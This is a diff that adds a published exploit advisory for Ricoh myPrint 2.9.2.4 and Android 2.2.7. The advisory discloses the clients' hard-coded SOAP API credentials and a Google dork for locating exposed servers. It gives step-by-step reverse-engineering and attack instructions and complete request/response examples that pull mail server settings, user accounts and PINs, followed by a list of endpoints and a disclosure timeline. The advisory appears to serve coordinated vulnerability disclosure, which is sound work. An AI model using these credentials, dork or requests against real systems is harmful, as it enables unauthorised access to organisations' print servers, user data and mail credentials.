@@ -1,0 +1,283 @@
+# Exploit Title: Ricoh myPrint 2.9.2.4 - Hard-Coded Credentials
+# Google Dork: intitle:"ricoh myprint" "Copyright Ricoh. All Rights Reserved"
+# Date: 2018-11-19
+# Exploit Author: Hodorsec
+# Vendor Homepage: https://www.ricoh.com
+# Software Link: https://www.ricoh-europe.com/support/product-support/software-support-detail.html?prodId=100-13203
+# Versions: 
+# myPrint - Windows client version 2.9.2.4
+# myPrint - Android client version 2.2.7
+# Tested on: Ricoh myPrint clients and WSDL webservice
+# WSDL URL format: https://{HOST}/RicohmyPrint/MyPrintWebService.asmx?wsdl
+# CVE: N/A
+
+# Description:
+# Hardcoded credentials in the Ricoh myPrint application 2.9.2.4 for Windows and 2.2.7 for Android 
+# give access to any externally disclosed myPrint WSDL API, as demonstrated by discovering 
+# API secrets of related Google cloud printers, encrypted passwords of mail servers and 
+# names of printed files.
+
+# Additional Information:
+# Hardcoded credentials in the Ricoh myPrint application 2.9.2.4 for Windows and 2.2.7 for 
+# Android (reverse-engineered, identical credentials), gives access
+# to any externally disclosed Ricoh myPrint WSDL API. Using the found credentials, several info can be obtained, such as:
+# * Show settings such as local paths, used mailserver, mailaddresses for POP/IMAP and encrypted passwords (appears to be stream-based
+#   encrypted, seeing different lengths of base64 hashes passwords (Algorithm yet unknown)). --> ReadMobileSettings
+# * Checks if a password is valid for ANY known user; returns "true" if password is valid for a known user --> IsPasswordValid
+# * Shows all user info such as ID, name  by looking up email alias --> IdentifierByEmailAlias 
+# * Show used internal IP addresses and TCP ports of related printers/server for Ricoh myPrint 
+# * Show related Google cloud printers with API secrets --> ReadGoogleCloudPrinters
+# * Show all printjob-statuses with filenames --> GetJobList
+# * Show related organizations --> ReadOrganizations
+
+# Affected Components:
+# * Tested Ricoh myPrint clients with indicated versions and probably any remotely accessible myPrint webserver with an accessible WSDL API.
+
+# Affected Code:
+# * Android client "WebService.java"
+...<SNIP>...
+public static final class 
+{
+
+    public static final String AUTH_PASS = "Kyg63WfC";
+    public static final String AUTH_USER = "ricohmyprint";
+    public static final String NS_RICOH = "http://RicohmyPrint.com/";
+    public static final String NS_SOAP12 = "http://www.w3.org/2003/05/soap-envelope";
+    public static final String PRE_RICOH = "ric";
+    public static final String PRE_SOAP12 = "soap";
+    public static final String SERVICE = "/RicohmyPrint/myprintwebservice.asmx";
+    public static final String SUPPORTED_LANGS[] = {
+        "en", "ca", "de", "es", "fr", "it", "nl", "no", "pl", "pt", 
+        "sv"
+    };
+...<SNIP>...
+
+Attack Type: 
+ * Remote
+
+Attack Vectors:
+Steps:
+ * Download the Android APK or Windows executable installer
+ * Reverse engineer the APK or DLL's from the Windows installer
+ * Look for the string "PASS" with a regex tool, which should pop up a hit
+ * Access the WSDL on a reachable Ricoh myPrint environment and enumerate operations with a SOAP tool (e.g. "ReadMobileSettings")
+ * Use any operation, substitute the "AuthSoapHd" values for UserName and Password with the found credentials
+ * Perform the request and check results
+
+Hardcoded Credentials:
+ * Username: ricohmyprint
+ * Password: Kyg63WfC
+
+Header requirement:
+Required for using in an SOAP WSDL POST message as a header with values:
+   <soapenv:Header>
+      <ric:AuthSoapHd>
+         <ric:UserName><![CDATA[ricohmyprint]]></ric:UserName>
+         <ric:Password><![CDATA[Kyg63WfC]]></ric:Password>
+         <ric:Version><![CDATA[0.1]]></ric:Version>
+         <ric:Application><![CDATA[Desktop]]></ric:Application>
+         <ric:DeviceId><![CDATA[1]]></ric:DeviceId>
+      </ric:AuthSoapHd>
+   </soapenv:Header>
+
+Examples:
+ * ReadMobileSettings
+---------------------------------------------
+REQUEST
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ric="http://RicohmyPrint.com/">
+   <soapenv:Header>
+      <ric:AuthSoapHd>
+         <ric:UserName><![CDATA[ricohmyprint]]></ric:UserName>
+         <ric:Password><![CDATA[Kyg63WfC]]></ric:Password>
+         <ric:Version><![CDATA[0.1]]></ric:Version>
+         <ric:Application><![CDATA[Desktop]]></ric:Application>
+         <ric:DeviceId><![CDATA[1]]></ric:DeviceId>
+      </ric:AuthSoapHd>
+   </soapenv:Header>
+   <soapenv:Body>
+      <ric:ReadMobileSettings/>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+RESPONSE
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <soap:Body>
+    <ReadMobileSettingsResponse xmlns="http://RicohmyPrint.com/">
+      <ReadMobileSettingsResult>
+        <WatchFolder>C:\ProgramData\RICOH\WatchFolder</WatchFolder>
+        <ProcessFolder>C:\ProgramData\RICOH\ProcessFolder</ProcessFolder>
+        <WebUploadFolder>C:\ProgramData\RICOH\WebUploadFolder</WebUploadFolder>
+        <MaximumNumberProcessesRunningAllowed>0</MaximumNumberProcessesRunningAllowed>
+        <ToFilePrinterName>myPrintToFile</ToFilePrinterName>
+        <PrinterDriverName>RICOH Aficio MP C3500 PCL 6</PrinterDriverName>
+        <POPIMAP>
+          <EmailHandling>SINGLE</EmailHandling>
+          <RetrievingInterval>5</RetrievingInterval>
+          <EmailProtocol>POP3</EmailProtocol>
+          <EmailServer>pop.someserver.local</EmailServer>
+          <Port>110</Port>
+          <PrintEmailBody>true</PrintEmailBody>
+          <UserName>print@someserver.local</UserName>
+          <Password>REDACTED</Password>
+          <Domain />
+          <EmailWebservice />
+          <ExchangeVersion>5</ExchangeVersion>
+          <OverrideCertificateCheck>false</OverrideCertificateCheck>
+        </POPIMAP>
+        <SMTP>
+          <SmtpServer>smtp.someserver.local</SmtpServer>
+          <Port>25</Port>
+          <EmailDisplayName>Ricoh myPrint</EmailDisplayName>
+          <EmailFrom>someuser@someserver.local</EmailFrom>
+          <EnableSsl>false</EnableSsl>
+          <UserName />
+          <Password>REDACTED</Password>
+        </SMTP>
+        <GCP>
+          <Id>0</Id>
+          <XmppPort>80</XmppPort>
+          <UseSocksProxy>false</UseSocksProxy>
+          <SocksProxyServer />
+          <SocksProxyVersion>5</SocksProxyVersion>
+          <SocksProxyPort>1080</SocksProxyPort>
+          <SocksProxyUser />
+        </GCP>
+        <LPRPrinterPort>0</LPRPrinterPort>
+        <UseLPR>false</UseLPR>
+        <EmailRefusal>postmaster</EmailRefusal>
+      </ReadMobileSettingsResult>
+    </ReadMobileSettingsResponse>
+  </soap:Body>
+</soap:Envelope>
+
+---------------------------------------------
+
+ * IdentifierByEmailAlias
+---------------------------------------------
+REQUEST:
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ric="http://RicohmyPrint.com/">
+   <soapenv:Header>
+      <ric:AuthSoapHd>
+         <ric:UserName><![CDATA[ricohmyprint]]></ric:UserName>
+         <ric:Password><![CDATA[Kyg63WfC]]></ric:Password>
+         <ric:Version><![CDATA[a]]></ric:Version>
+         <ric:Application><![CDATA[b]]></ric:Application>
+         <ric:DeviceId><![CDATA[c]]></ric:DeviceId>
+      </ric:AuthSoapHd>
+   </soapenv:Header>
+   <soapenv:Body>
+      <ric:IdentifierByEmailAlias>
+         <!--Optional:-->
+         <ric:emailAlias>admin</ric:emailAlias>
+      </ric:IdentifierByEmailAlias>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+RESPONSE:
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+   <soap:Body>
+      <IdentifierByEmailAliasResponse xmlns="http://RicohmyPrint.com/">
+         <IdentifierByEmailAliasResult>
+            <Exists>true</Exists>
+            <Account>
+               <Id>1337</Id>
+               <AccountId>83e754ff-fa1d-48b6-adb2-7cb60a22476d</AccountId>
+               <UserName>admin</UserName>
+               <Emailaddress>someuser@someserver.local</Emailaddress>
+               <PersonalmyPrintId>1osd9KJ</PersonalmyPrintId>
+               <Balance>5</Balance>
+               <BalanceFormatted>€ 5,00</BalanceFormatted>
+               <Primarypin>123456</Primarypin>
+               <SecondaryPin/>
+               <OrganisationId>1</OrganisationId>
+               <ByClientCreated>false</ByClientCreated>
+               <IsActivated>true</IsActivated>
+               <GuestAccount>false</GuestAccount>
+               <Aliasses/>
+               <Transactions/>
+               <Language>GB</Language>
+               <MpPrintingPreferences>
+                  <Id>0</Id>
+                  <DuplexPreference>TwoSidedLongEdge</DuplexPreference>
+                  <ColorPreference>Monochrome</ColorPreference>
+                  <ChangingDuplexEnabled>true</ChangingDuplexEnabled>
+                  <ChangingColorEnabled>true</ChangingColorEnabled>
+                  <StaplePreference>StapleTopLeft</StaplePreference>
+                  <PagePerSheetPreference>One</PagePerSheetPreference>
+                  <ChangingStapleEnabled>true</ChangingStapleEnabled>
+                  <ChangingPagePerSheetEnabled>true</ChangingPagePerSheetEnabled>
+               </MpPrintingPreferences>
+               <QpilotCardID/>
+               <ClientType>IDPLocal</ClientType>
+               <Administrator>false</Administrator>
+               <HelpDesk>false</HelpDesk>
+               <PrintQueue>
+                  <Id>1</Id>
+                  <PrinterId>1</PrinterId>
+                  <PrintQueueType>LPR</PrintQueueType>
+                  <PrinterName>Default printer</PrinterName>
+                  <PrinterAddress>127.0.0.1</PrinterAddress>
+                  <QueueName>lp</QueueName>
+                  <Port>515</Port>
+                  <IsPublic>true</IsPublic>
+                  <Priority>0</Priority>
+                  <Active>true</Active>
+               </PrintQueue>
+               <Domain/>
+            </Account>
+         </IdentifierByEmailAliasResult>
+      </IdentifierByEmailAliasResponse>
+   </soap:Body>
+</soap:Envelope>
+
+---------------------------------------------
+
+Soap Endpoints:
+ * ApplyAgreementAcceptance
+ * ChangePassword
+ * ClearCache
+ * CreateAccount
+ * CreateAccountByCardId
+ * FinishedJobProcessing
+ * GetConditionsUri
+ * GetImage
+ * GetJobList
+ * GetLanguageTable
+ * GetPrintCapabilities
+ * GetPrintQueueRuleResult
+ * GetSupportUri
+ * IdentifierByEmailAlias
+ * IsPasswordValid
+ * LogIn
+ * Operation
+ * ReadAccount
+ * ReadGoogleCloudPrinters
+ * ReadMobileSettings
+ * ReadMpPrintQueues
+ * ReadOrganizations
+ * ReadSettings
+ * ReSendPincode
+ * ResetPassword
+ * RetrieveCloudPrintJobsAllowed
+ * RetrieveEmailAllowed
+ * SendCancelPrintJob
+ * SendHeartbeat
+ * SendPrinterName
+ * Test
+ * UpdateAccount
+ * UpdateGoogleCloudPrinter
+ * UploadFile
+ * UploadFileAndPrintTicket
+ * VerifyJobProcessing
+ * VoucherToCash
+ * WaitingJob
+ * WriteLog
+
+Disclosure Timeline using CERT/CC disclosure policy:
+ - 04-10-18: Requested CVE
+ - 05-10-18: Contacted vendor for initial contact, used several publicly known mailaddresses
+ - 10-10-18: Contacted CERT for Vulnerability Disclosure coordination due to no response from vendor
+ - 22-10-18: CERT responded it received no response on their behalf from vendor
+ - 22-10-18: Sent reminder to vendor
+ - 19-11-18: Public Disclosure
